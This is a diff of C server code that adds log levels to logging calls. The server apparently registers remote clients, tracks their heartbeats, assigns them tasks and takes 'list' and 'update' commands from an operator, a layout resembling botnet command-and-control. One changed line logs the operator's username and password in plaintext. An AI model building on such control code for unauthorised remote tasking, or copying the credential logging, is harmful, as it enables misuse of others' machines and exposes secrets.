@@ -49,7 +49,7 @@ int certify_register_packet(struct packet* p)
         return 1;
     else
     {
-        alexjlz_log("random_str:%s client_hash:%s server_hash:%s\n", random_str, client_hash, server_hash);
+        alexjlz_log(6, "random_str:%s client_hash:%s server_hash:%s\n", random_str, client_hash, server_hash);
         return 0;
     }
 }
@@ -76,7 +76,7 @@ int alexjlz_register(struct client *c, struct packet *p)
     {
         if ( strcmp(c->uuid, c_iter->uuid) == 0 ) // heartbeat
         {
-            alexjlz_log("client <<%s>> (ip:%s)  heartbeat!\n", c_iter->uuid, c_iter->ip);
+            alexjlz_log(3, "client <<%s>> (ip:%s)  heartbeat!\n", c_iter->uuid, c_iter->ip);
 
             // update info
             strcpy(c_iter->ip, c->ip);  // update ip 
@@ -96,7 +96,7 @@ int alexjlz_register(struct client *c, struct packet *p)
     }
     if ( c_iter == NULL )  // register
     {
-        alexjlz_log("client <<%s>> (ip:%s)  register!\n", c->uuid, c->ip);
+        alexjlz_log(1, "client <<%s>> (ip:%s)  register!\n", c->uuid, c->ip);
         list_add(client_list, c, sizeof(struct client));
         status = 0;
     }
@@ -123,7 +123,7 @@ void *serve_client ( void *arg )
     /* get remote ip address and record it */
     if ( get_remote_ip(client_fd, client_ip) == -1 )
     {
-        alexjlz_log("Error, failed to get client ip, exit...\n");
+        alexjlz_log(3, "Error, failed to get client ip, exit...\n");
         return ;
     }
 
@@ -139,20 +139,20 @@ void *serve_client ( void *arg )
 
         if ( get_remote_ip(client_fd, client_ip) == -1 )
         {
-            alexjlz_log("Warn, failed to get client ip, exit...\n");
+            alexjlz_log(3, "Warn, failed to get client ip, exit...\n");
         }
         /* wait for client to send packet for 6 secs */
         retval = select(client_fd+1, &client_fd_set, NULL, NULL, &tv);
         if ( retval == -1 )  // error
         {
-            alexjlz_log("Error, select retval == -1\n");
+            alexjlz_log(3, "Error, select retval == -1\n");
             if ( check_fd(client_fd) )
                 close(client_fd);
             return ;
         }
         else if ( retval == 0 ) // timeout
         {
-            alexjlz_log("Error, select timeout\n");
+            alexjlz_log(3, "Error, select timeout\n");
             if ( check_fd(client_fd) )
                 close(client_fd);
             return;
@@ -160,7 +160,7 @@ void *serve_client ( void *arg )
         bytes_read = readn ( client_fd, &p, sizeof(p) );  // else readable
         if ( bytes_read != sizeof(p) )
         {
-            alexjlz_log("Error, serve readn read %d bytes\n", bytes_read);
+            alexjlz_log(1, "Error, serve readn read %d bytes\n", bytes_read);
             if ( check_fd(client_fd) )
                 close(client_fd);
             return ;
@@ -175,14 +175,14 @@ void *serve_client ( void *arg )
         }
         else if ( status == 1 )  // register ( or heartbeat ) client, and maybe sign task for client
         {
-            alexjlz_log("Sign task to client\n");
+            alexjlz_log(1, "Sign task to client\n");
             bzero(&q, sizeof(q));
             q.type = packet_task_sign;
             q.flag = 0;
             sprintf(q.value, "%s", c.task);
             if ( writen( client_fd, &q, sizeof(q) ) != sizeof(q))
             {
-                alexjlz_log("Error, sign task: %s to client: %s, ip:%s\n", &(c.task), &(c.uuid), &(c.ip));
+                alexjlz_log(1, "Error, sign task: %s to client: %s, ip:%s\n", &(c.task), &(c.uuid), &(c.ip));
             }
         }
     }
@@ -379,7 +379,7 @@ int process_command(struct alexjlz_packet *p, list_p output)
     }
     else if ( strcmp(cmd, "list") == 0 )
     {
-        alexjlz_log("CMD:list\n");
+        alexjlz_log(1, "CMD:list\n");
         pthread_mutex_lock(&client_list_mutex);
         struct client *c_iter = NULL;
         list_iter_p client_list_iter = list_iterator(client_list, FRONT);
@@ -393,7 +393,7 @@ int process_command(struct alexjlz_packet *p, list_p output)
     }
     else if ( strcmp(cmd, "update") == 0 )
     {
-        alexjlz_log("CMD:update\n");
+        alexjlz_log(1, "CMD:update\n");
         pthread_mutex_lock(&client_list_mutex);
         struct client *c_iter = NULL;
         list_iter_p client_list_iter = list_iterator(client_list, FRONT);
@@ -459,7 +459,7 @@ int certify_alexjlz(struct alexjlz_packet *p)
 
     parse_string(p->value, username, "username", 63);
     parse_string(p->value, password, "password", 63);
-    alexjlz_log("username:%s password:%s\n", username, password);
+    alexjlz_log(0, "username:%s password:%s\n", username, password);
     if ( (strcmp(username, USERNAME)!=0) || (strcmp(password, PASSWORD)!=0) )
         return 0;
     else
@@ -530,16 +530,16 @@ void *serve_alexjlz( void *arg)
                     list_iter_p output_list_iter = list_iterator(output, FRONT);
                     while ( (output_packet = list_next(output_list_iter)) != NULL )
                     {
-                        alexjlz_log("Write to alexjlz:%s\n", output_packet->value);
+                        alexjlz_log(3, "Write to alexjlz:%s\n", output_packet->value);
                         if ( writen(alexjlz_fd, output_packet, sizeof(*output_packet)) != sizeof(*output_packet) )
                         {
-                            alexjlz_log("Error, serve_alexjlz writen not enough bytes\n");
+                            alexjlz_log(3, "Error, serve_alexjlz writen not enough bytes\n");
                             break;
                         }
                     }
                 }
                 destroy_list(output);
-                alexjlz_log("Cmd process success\n");
+                alexjlz_log(3, "Cmd process success\n");
             }
         }
     }
